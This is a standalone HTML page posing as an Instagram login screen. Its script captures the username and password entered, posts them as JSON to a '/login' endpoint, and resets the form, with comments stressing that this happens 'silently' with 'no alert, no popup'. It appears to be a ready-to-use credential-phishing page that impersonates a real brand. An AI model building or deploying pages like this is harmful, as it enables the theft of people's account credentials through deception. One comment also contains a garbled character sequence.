<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <style>
    body { font-family: Arial, sans-serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; }
    form { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input { display: block; margin: 10px 0; padding: 10px; width: 200px; }
    button { padding: 10px 20px; background: #3897f0; border: none; color: white; cursor: pointer; border-radius: 4px; }
    button:hover { background: #2f81d3; }
  </style>
</head>
<body>

<form id="loginForm">
  <h2>Instagram</h2>
  <input type="text" name="username" placeholder="Username" required />
  <input type="password" name="password" placeholder="Password" required />
  <button type="submit">Login</button>
</form>

<script>
const form = document.getElementById('loginForm');

form.addEventListener('submit', (e) => {
  e.preventDefault(); // prevent page reload

  const formData = new FormData(form);
  const data = {
    username: formData.get('username'),
    password: formData.get('password')
  };

  // Send data to server silently
  fetch('/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }).then(() => {
    form.reset(); // optional: clear the form
    // âœ… No alert, no popup
  }).catch(err => {
    console.error('Error:', err);
  });
});
</script>

</body>
</html>
